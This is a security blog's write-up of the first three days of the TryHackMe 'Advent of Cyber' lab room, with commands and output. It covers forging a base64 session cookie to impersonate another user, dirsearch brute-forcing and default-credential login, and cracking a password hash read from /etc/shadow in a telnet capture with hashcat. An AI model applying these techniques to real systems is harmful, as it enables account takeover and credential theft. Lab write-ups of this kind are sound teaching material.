@@ -1,0 +1,428 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - Advent of Cyber" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-advent-of-cyber/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-advent-of-cyber/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-01T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - Advent of Cyber" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - Advent of Cyber","dateModified":"2021-05-13T23:09:48+05:30","datePublished":"2021-05-01T00:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-advent-of-cyber/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-advent-of-cyber/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - Advent of Cyber | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - Advent of Cyber</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - Advent of Cyber</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 1, 2021, 12:00 AM +0530" > May 1 <i class="unloaded">2021-05-01T00:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, May 13, 2021, 11:09 PM +0530" > May 13 <i class="unloaded">2021-05-13T23:09:48+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2823 words">15 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="advent-of-cyber"><a href="https://tryhackme.com/room/25daysofchristmas" target="_blank">Advent of Cyber</a></h2><p>This room contains info and methods to recon and enumerate network captures, protocols, web servers, databases, binaries and SUID, privilege escalations, osint, cloud and encryption.</p><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a></p><h2 id="task-6---day-1---inventory-managemement">Task 6 - Day 1 - Inventory Managemement</h2><p>This task is about cookie manipulation using hex codes.</p><h3 id="references">References</h3><ul><li><a href="https://docs.google.com/document/d/1PHs7uRS1whLY9tgxH1lj-bnEVWtXPXpo45zWUlbknpU/edit?usp=sharing" target="_blank">TryHackMe supporting material</a><li><a href="https://reqbin.com/req/c-2cd3jxee/curl-post-with-basic-authentication" target="_blank">Curl POST authentication</a></ul><p>Use <code>firefox</code> to login <code>http://&lt;ip&gt;:3000</code> to get and simulate cookies for login to bypass auth.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="redirect%20to%20/login%0Ainspect%20page%0Aregister%20and%20login" type="button"></button></div></div><pre><code>redirect to /login
+inspect page
+register and login
+</code></pre><p>Before login, there will not be a cookie set. After registering and login, inspect for cookies in <code>firefox</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="inspect%20page%20(cookie%20-%20authid)%0Acookie%20value%20-%20decode%20(from%20base64%20-%20%3Ccookie%20-%20auth%20with%20username%20appended%3E)%0Aencode%20(to%20base64%20-%20mcinventory%3Cappend%20auth%20cookie%20piece%3E%20-%20%3Chash%3E)%0A%0AGet%20cookie%20value%20and%20append%20to%20user%20to%20generate%20%60mcinventory%60%20user%20cookie%20and%20to%20get%20item%20the%20user%20requested%20for.%0A%7B%25%20capture%20code%20%25%7D%7B%25%20raw%20%25%7Dcookie%20value%20-%20replace%20with%20mcinventory's%20cookie%20value%0Areload%20page%0Amcinventory's%20inventory%20list%20(requested%20item%20-%20%3Citem%3E)" type="button"></button></div></div><pre><code>inspect page (cookie - authid)
+cookie value - decode (from base64 - &lt;cookie - auth with username appended&gt;)
+encode (to base64 - mcinventory&lt;append auth cookie piece&gt; - &lt;hash&gt;)
+
+Get cookie value and append to user to generate `mcinventory` user cookie and to get item the user requested for.
+{% capture code %}{% raw %}cookie value - replace with mcinventory's cookie value
+reload page
+mcinventory's inventory list (requested item - &lt;item&gt;)
+</code></pre><h2 id="task-7---day-2---arctic-forum">Task 7 - Day 2 - Arctic Forum</h2><p>This task is about using <code>dirsearch</code> to brute-force hidden directories in web site and logging in using default credentials.</p><h3 id="references-1">References</h3><ul><li><a href="https://sourceforge.net/projects/dirbuster/" target="_blank">Dirbuster Reference</a><li><a href="https://github.com/maurosoria/dirsearch" target="_blank">Dirsearch Reference</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-dirsearch" target="_blank">Dirsearch Reference</a><li><a href="https://github.com/ashu-savani/arctic-digital-design" target="_blank">Arctic Digital Design Reference</a></ul><p>Use <code>dirsearch</code> to get available directories, their redirection, response code and size for web site.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="./dirsearch.py%20-u%20http://%3Cip%3E:3000%20-w%20/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt%20-e%20html" type="button"></button></div></div><pre><code>./dirsearch.py -u http://&lt;ip&gt;:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="%20_%7C.%20_%20_%20%20_%20%20_%20%20_%20_%7C_%20%20%20%20v0.4.1%0A(_%7C%7C%7C%20_)%20(/_(_%7C%7C%20(_%7C%20)%0A%0AExtensions:%20html%20%7C%20HTTP%20method:%20GET%20%7C%20Threads:%2030%20%7C%20Wordlist%20size:%20220520%0A%0AError%20Log:%20/opt/dirsearch/logs/errors-21-01-15_14-56-10.log%0A%0ATarget:%20http://%3Cip%3E:3000/%0A%0AOutput%20File:%20/opt/dirsearch/reports/%3Cip%3E/_21-01-15_14-56-10.txt%0A%0A[14:56:11]%20Starting:%0A[14:56:11]%20302%20-%20%20%2028B%20%20-%20/home%20%20-%3E%20%20/login%0A[14:56:11]%20200%20-%20%20%20%202KB%20-%20/login%0A[14:56:11]%20302%20-%20%20%2027B%20%20-%20/admin%20%20-%3E%20%20/home%0A[14:56:11]%20301%20-%20%20179B%20%20-%20/assets%20%20-%3E%20%20/assets/%0A[14:56:11]%20302%20-%20%20%2028B%20%20-%20/Home%20%20-%3E%20%20/login%0A[14:56:12]%20301%20-%20%20173B%20%20-%20/css%20%20-%3E%20%20/css/%0A[14:56:12]%20200%20-%20%20%20%202KB%20-%20/Login%0A[14:56:12]%20301%20-%20%20171B%20%20-%20/js%20%20-%3E%20%20/js/%0A[14:56:13]%20302%20-%20%20%2028B%20%20-%20/logout%20%20-%3E%20%20/login%0A[14:56:17]%20200%20-%20%20%20%202KB%20-%20/%3Chidden-page%3E%0A[14:56:21]%20302%20-%20%20%2027B%20%20-%20/Admin%20%20-%3E%20%20/home%0A[14:56:31]%20302%20-%20%20%2028B%20%20-%20/HOME%20%20-%3E%20%20/login%0A[14:56:36]%20302%20-%20%20%2028B%20%20-%20/Logout%20%20-%3E%20%20/login%0A[15:00:22]%20200%20-%20%20%20%202KB%20-%20/%3Chidden-page%3E%0A[15:00:51]%20200%20-%20%20%20%202KB%20-%20/LogIn%0A[15:05:36]%20200%20-%20%20%20%202KB%20-%20/LOGIN%0A%0ATask%20Completed" type="button"></button></div></div><pre><code> _|. _ _  _  _  _ _|_    v0.4.1
+(_||| _) (/_(_|| (_| )
+
+Extensions: html | HTTP method: GET | Threads: 30 | Wordlist size: 220520
+
+Error Log: /opt/dirsearch/logs/errors-21-01-15_14-56-10.log
+
+Target: http://&lt;ip&gt;:3000/
+
+Output File: /opt/dirsearch/reports/&lt;ip&gt;/_21-01-15_14-56-10.txt
+
+[14:56:11] Starting:
+[14:56:11] 302 -   28B  - /home  -&gt;  /login
+[14:56:11] 200 -    2KB - /login
+[14:56:11] 302 -   27B  - /admin  -&gt;  /home
+[14:56:11] 301 -  179B  - /assets  -&gt;  /assets/
+[14:56:11] 302 -   28B  - /Home  -&gt;  /login
+[14:56:12] 301 -  173B  - /css  -&gt;  /css/
+[14:56:12] 200 -    2KB - /Login
+[14:56:12] 301 -  171B  - /js  -&gt;  /js/
+[14:56:13] 302 -   28B  - /logout  -&gt;  /login
+[14:56:17] 200 -    2KB - /&lt;hidden-page&gt;
+[14:56:21] 302 -   27B  - /Admin  -&gt;  /home
+[14:56:31] 302 -   28B  - /HOME  -&gt;  /login
+[14:56:36] 302 -   28B  - /Logout  -&gt;  /login
+[15:00:22] 200 -    2KB - /&lt;hidden-page&gt;
+[15:00:51] 200 -    2KB - /LogIn
+[15:05:36] 200 -    2KB - /LOGIN
+
+Task Completed
+</code></pre><p>Once the hidden page is found, inspect its source using <code>firefox</code> or <code>curl</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="curl%20%3Cip%3E:3000/%3Chidden-page%3E" type="button"></button></div></div><pre><code>curl &lt;ip&gt;:3000/&lt;hidden-page&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="%3C!DOCTYPE%20html%3E%0A%3Chtml%3E%0A%20%20%20%20%3Chead%3E%0A%20%20%20%20%3Ctitle%3EArctic%20Forum%20%7C%20Admin%20Login%3C/title%3E%0A%20%20%20%20%3Clink%20rel=%22stylesheet%22%20href=%22../css/bootstrap.min.css%22%3E%0A%20%20%20%20%3Cscript%20src=%22../js/bootstrap.min.js%22%3E%3C/script%3E%0A%3C/head%3E%0A%20%20%20%20%3Cstyle%3E%0Aa%20%7B%0A%20%20%20%20color:%20white;%0A%7D%0A%3C/style%3E%0A%3Cdiv%20class=%22container%22%3E%0A%20%20%20%20%3Cnav%20class=%22navbar%20navbar-expand-lg%22%20style=%22background-color:%20#656565;%20border-bottom-left-radius:%205px;%20border-bottom-right-radius:%205px;%22%3E%0A%20%20%20%20%3Ca%20class=%22navbar-brand%22%20href=%22#%22%3E%0A%20%20%20%20%3Cimg%20style='height:%2050px'%20src=%22assets/pole.png%22%3E%0A%20%20%20%20Arctic%20Forum%0A%20%20%20%20%3C/a%3E%0A%20%20%20%20%3Cbutton%20class=%22navbar-toggler%22%20type=%22button%22%20data-toggle=%22collapse%22%20data-target=%22#navbarNav%22%20aria-controls=%22navbarNav%22%20aria-expanded=%22false%22%20aria-label=%22Toggle%20navigation%22%3E%0A%20%20%20%20%3Cspan%20class=%22navbar-toggler-icon%22%3E%3C/span%3E%0A%20%20%20%20%3C/button%3E%0A%20%20%20%20%3Cdiv%20class=%22collapse%20navbar-collapse%22%20id=%22navbarNav%22%3E%0A%20%20%20%20%3Cul%20class=%22navbar-nav%22%3E%0A%20%20%20%20%20%20%20%20%3Cli%20class=%22nav-item%22%3E%0A%20%20%20%20%20%20%20%20%3Ca%20class=%22nav-link%22%20href=%22/login%22%3ELogin%3C/a%3E%0A%20%20%20%20%20%20%20%20%3C/li%3E%0A%20%20%20%20%3C/ul%3E%0A%20%20%20%20%3C/div%3E%0A%3C/div%3E%0A%3C/nav%3E%0A%20%20%20%20%3C/br%3E%0A%20%20%20%20%3Cdiv%20class=%22container%22%3E%0A%20%20%20%20%3Ch1%3E%20Admin%20Login%20%3C/h1%3E%0A%20%20%20%20%20%20%20%20%3Cform%20method=%22post%22%20action=%22/%3Chidden-page%3E%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20for=%22item%22%3EEmail%3C/label%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22text%22%20class=%22form-control%22%20id=%22username%22%20name=%22username%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20for=%22item%22%3EPassword%3C/label%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22password%22%20class=%22form-control%22%20id=%22password%22%20name=%22password%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-default%22%3ESubmit%3C/button%3E%0A%20%20%20%20%20%20%20%20%3C/form%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C!--%0A%20%20%20%20Admin%20portal%20created%20by%20arctic%20digital%20design%20-%20check%20out%20our%20github%20repo%0A%20%20%20%20--%3E%0A%3C/html%3E" type="button"></button></div></div><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+    &lt;title&gt;Arctic Forum | Admin Login&lt;/title&gt;
+    &lt;link rel="stylesheet" href="../css/bootstrap.min.css"&gt;
+    &lt;script src="../js/bootstrap.min.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+    &lt;style&gt;
+a {
+    color: white;
+}
+&lt;/style&gt;
+&lt;div class="container"&gt;
+    &lt;nav class="navbar navbar-expand-lg" style="background-color: #656565; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px;"&gt;
+    &lt;a class="navbar-brand" href="#"&gt;
+    &lt;img style='height: 50px' src="assets/pole.png"&gt;
+    Arctic Forum
+    &lt;/a&gt;
+    &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"&gt;
+    &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
+    &lt;/button&gt;
+    &lt;div class="collapse navbar-collapse" id="navbarNav"&gt;
+    &lt;ul class="navbar-nav"&gt;
+        &lt;li class="nav-item"&gt;
+        &lt;a class="nav-link" href="/login"&gt;Login&lt;/a&gt;
+        &lt;/li&gt;
+    &lt;/ul&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;/nav&gt;
+    &lt;/br&gt;
+    &lt;div class="container"&gt;
+    &lt;h1&gt; Admin Login &lt;/h1&gt;
+        &lt;form method="post" action="/&lt;hidden-page&gt;"&gt;
+            &lt;div class="form-group"&gt;
+                &lt;label for="item"&gt;Email&lt;/label&gt;
+                &lt;input type="text" class="form-control" id="username" name="username"&gt;
+            &lt;/div&gt;
+            &lt;div class="form-group"&gt;
+                &lt;label for="item"&gt;Password&lt;/label&gt;
+                &lt;input type="password" class="form-control" id="password" name="password"&gt;
+            &lt;/div&gt;
+            &lt;button type="submit" class="btn btn-default"&gt;Submit&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+    &lt;!--
+    Admin portal created by arctic digital design - check out our github repo
+    --&gt;
+&lt;/html&gt;
+</code></pre><p>From the page source, check github repo for <a href="https://github.com/ashu-savani/arctic-digital-design" target="_blank">Arctic Digital Design</a>. There will be a default credential available. Try that in <code>firefox</code> to see if login is working and get the flag.</p><h2 id="task-8---day-3---evil-elf">Task 8 - Day 3 - Evil Elf</h2><p>This task is about using <code>wireshark</code> to analyse <code>telnet</code> packets and decrypting password hash using <code>hashcat</code> to get login credentials.</p><h3 id="references-2">References</h3><ul><li><a href="https://docs.google.com/document/d/1ZVsOtW7mM-4neZZ4QtYCEp__exiMrvlUCXTxhB-zyxk/edit" target="_blank">TryHackMe supporting material</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-hashcat" target="_blank">Hashcat Reference</a></ul><p>Using <code>wireshark</code> to analyse the packet trace.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Statistics%0A%20%20-%20Protocol%20Hierarchy%0A%0ATelnet%0A%20%20-%20Apply%20as%20filter%0A%20%20%20%20%20%20-%20Selected" type="button"></button></div></div><pre><code>Statistics
+  - Protocol Hierarchy
+
+Telnet
+  - Apply as filter
+      - Selected
+</code></pre><p>Check the filtered data, under packet number <code>2255</code>. Since the telnet communication is un-encrypted, the application data can be captured as plain-text by <code>wireshark</code>.</p><p>The packet number <code>2906</code> shows someone executed command <code>cat /etc/shadow</code> over telnet, and its reply packet should contain the file contents. The password hash for user <code>buddy</code> can be found in packet <code>2908</code>.</p><p>Use <code>hashcat</code> crack the hash obtained from <code>wireshark</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="hashcat%20-m%201800%20'%3Chash%3E'%20/usr/share/wordlists/rockyou.txt" type="button"></button></div></div><pre><code>hashcat -m 1800 '&lt;hash&gt;' /usr/share/wordlists/rockyou.txt
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="hashcat%20(v6.1.1-66-g6a419d06)%20starting...%0A%0AMinimum%20password%20length%20supported%20by%20kernel:%200%0AMaximum%20password%20length%20supported%20by%20kernel:%20256%0A%0AHashes:%201%20digests;%201%20unique%20digests,%201%20unique%20salts%0ABitmaps:%2016%20bits,%2065536%20entries,%200x0000ffff%20mask,%20262144%20bytes,%205/13%20rotates%0ARules:%201%0A%0AApplicable%20optimizers%20applied:%0A*%20Zero-Byte%0A*%20Single-Hash%0A*%20Single-Salt%0A*%20Uses-64-Bit%0A%0AHost%20memory%20required%20for%20this%20attack:%200%20MB%0A%0ADictionary%20cache%20built:%0A*%20Filename..:%20/usr/share/wordlists/rockyou.txt%0A*%20Passwords.:%2014344391%0A*%20Bytes.....:%20139921497%0A*%20Keyspace..:%2014344384%0A*%20Runtime...:%205%20secs%0A%0A%3Chash%3E:%3Cpassword%3E%0A%0ASession..........:%20hashcat%0AStatus...........:%20Cracked%0AHash.Name........:%20sha512crypt%20$6$,%20SHA512%20(Unix)%0AHash.Target......:%20%3Chash%3E%0ATime.Started.....:%20Sat%20Jan%2016%2014:42:17%202021%20(0%20secs)%0ATime.Estimated...:%20Sat%20Jan%2016%2014:42:17%202021%20(0%20secs)%0AGuess.Base.......:%20File%20(/usr/share/wordlists/rockyou.txt)%0AGuess.Queue......:%201/1%20(100.00%25)%0ASpeed.#1.........:%20%20%20%20%20%20606%20H/s%20(10.41ms)%20@%20Accel:64%20Loops:256%20Thr:1%20Vec:4%0ARecovered........:%201/1%20(100.00%25)%20Digests%0AProgress.........:%20256/14344384%20(0.00%25)%0ARejected.........:%200/256%20(0.00%25)%0ARestore.Point....:%20128/14344384%20(0.00%25)%0ARestore.Sub.#1...:%20Salt:0%20Amplifier:0-1%20Iteration:4864-5000%0ACandidates.#1....:%20carolina%20-%3E%20freedom%0A%0AStarted:%20Sat%20Jan%2016%2014:41:39%202021%0AStopped:%20Sat%20Jan%2016%2014:42:18%202021" type="button"></button></div></div><pre><code>hashcat (v6.1.1-66-g6a419d06) starting...
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 5 secs
+
+&lt;hash&gt;:&lt;password&gt;
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: &lt;hash&gt;
+Time.Started.....: Sat Jan 16 14:42:17 2021 (0 secs)
+Time.Estimated...: Sat Jan 16 14:42:17 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      606 H/s (10.41ms) @ Accel:64 Loops:256 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 256/14344384 (0.00%)
+Rejected.........: 0/256 (0.00%)
+Restore.Point....: 128/14344384 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
+Candidates.#1....: carolina -&gt; freedom
+
+Started: Sat Jan 16 14:41:39 2021
+Stopped: Sat Jan 16 14:42:18 2021
